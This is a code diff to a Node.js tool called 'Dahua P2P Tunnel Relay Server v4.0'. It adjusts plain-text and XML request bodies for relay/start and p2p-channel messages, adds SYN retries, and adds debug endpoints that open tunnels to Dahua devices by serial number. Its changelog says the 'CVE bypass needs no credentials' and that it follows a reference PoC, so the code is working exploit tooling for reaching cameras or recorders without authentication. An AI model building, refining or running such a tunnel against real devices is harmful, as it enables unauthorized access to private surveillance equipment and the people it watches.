@@ -2,9 +2,9 @@
 /**
  * Dahua P2P Tunnel Relay Server v4.0
  * ===================================
- * v4.0: FIXED ROOT CAUSE — relay/start, p2p-channel, and relay-channel bodies
- *   changed from XML to PLAIN TEXT (matching reference PoC format).
- *   Added 3-attempt SYN retry for agent PTCP handshake.
+ * v4.0: FIXED ROOT CAUSE — relay/start and relay-channel bodies changed to PLAIN TEXT
+ *   (p2p-channel stays XML — device only responds to XML format);
+ *   Added 3-attempt SYN retry for agent PTCP handshake;
  *   Added /debug_full/:serial endpoint for full tunnel validation.
  * v3.9: FIXED agent PTCP handshake timeout — clear mainSock queue before handshake;
  *   removed default credential fallback (CVE bypass needs no credentials).
@@ -387,11 +387,9 @@ async function establishTunnel(serial, username, password, targetPort) {
     mainSock.setRemote(agentServer, agentPort);
     var startRes = await mainSock.request('/relay/start/' + token, ':0');
 
-    // Build channel request with PLAIN TEXT body (v4.0 fix: was XML, should be plain text)
-    // Format: aidHex + 'true' + laddr + '5.0.0'  (auth is empty when no credentials)
+    // p2p-channel: XML body (v4.0 fix: XML format works — device responds with Identify+LocalAddr+PubAddr)
     var aidHex = Array.from(aid).map(function(b) { return b.toString(16); }).join(' ');
-    var laddr = '127.0.0.1:' + deviceSock.lport;
-    var channelBody = aidHex + 'true' + laddr + '5.0.0';
+    var channelBody = '<body><Identify>' + aidHex + '</Identify><PubAddr>' + agentServer + ':' + agentPort + '</PubAddr></body>\r\n';
     deviceSock.setRemote(mainIp, MAIN_PORT);
     await deviceSock.request('/device/' + serial + '/p2p-channel', channelBody, false);
 
@@ -769,18 +767,18 @@ var server = http.createServer(async function(req, res) {
       steps.push('Agent: ' + agentAddr + ' Token=' + token);
       var aParts = agentAddr.split(':');
 
-      // Start relay FIRST (XML body)
+      // Start relay (plain text — v4.0)
       mainSock.setRemote(aParts[0], parseInt(aParts[1]));
-      var dbgStart = await mainSock.request('/relay/start/'+token, '<body><Client>:0</Client></body>');
-      steps.push('Relay start: ' + dbgStart.code);
+      var dbgStart = await mainSock.request('/relay/start/'+token, ':0');
+      steps.push('Relay start (plain): ' + dbgStart.code);
 
-      // === Channel request with PLAIN TEXT body (v4.0 fix) ===
+      // === Channel request with XML body (v4.0: XML works, plain text doesn't) ===
       var sockA = new P2PSocket(); await sockA.bind(); sockA.setRemote(mainIp, MAIN_PORT);
       var dbgAid = crypto.randomBytes(8);
       var dbgAidHex = Array.from(dbgAid).map(function(b) { return b.toString(16); }).join(' ');
-      var channelBody = dbgAidHex + 'true127.0.0.1:' + sockA.lport + '5.0.0';
+      var channelBody = '<body><Identify>' + dbgAidHex + '</Identify><PubAddr>' + aParts[0] + ':' + parseInt(aParts[1]) + '</PubAddr></body>\r\n';
       await sockA.request('/device/'+debugSerial+'/p2p-channel', channelBody, false);
-      steps.push('Channel request sent (plain text, port '+sockA.lport+')');
+      steps.push('Channel request sent (XML body, port '+sockA.lport+')');
       // Read response: HTTP 100 then HTTP 200, skipping STUN packets
       var gotResponse = false;
       for (var di = 0; di < 8; di++) {
@@ -837,13 +835,13 @@ var server = http.createServer(async function(req, res) {
       var dfStart = await dfMain.request('/relay/start/'+dfToken, ':0');
       dfSteps.push('Relay start (plain): ' + dfStart.code);
 
-      // Channel request (plain text)
+      // Channel request (XML body — v4.0: XML works for p2p-channel)
       var dfDevSock = new P2PSocket(); await dfDevSock.bind(); dfDevSock.setRemote(dfIp, MAIN_PORT);
       var dfAid = crypto.randomBytes(8);
       var dfAidHex = Array.from(dfAid).map(function(b) { return b.toString(16); }).join(' ');
-      var dfChanBody = dfAidHex + 'true127.0.0.1:' + dfDevSock.lport + '5.0.0';
+      var dfChanBody = '<body><Identify>' + dfAidHex + '</Identify><PubAddr>' + dfAParts[0] + ':' + parseInt(dfAParts[1]) + '</PubAddr></body>\r\n';
       await dfDevSock.request('/device/'+dfSerial+'/p2p-channel', dfChanBody, false);
-      dfSteps.push('Channel sent (plain text)');
+      dfSteps.push('Channel sent (XML body)');
 
       var dfDevParsed = null;
       for (var dfi = 0; dfi < 8; dfi++) {
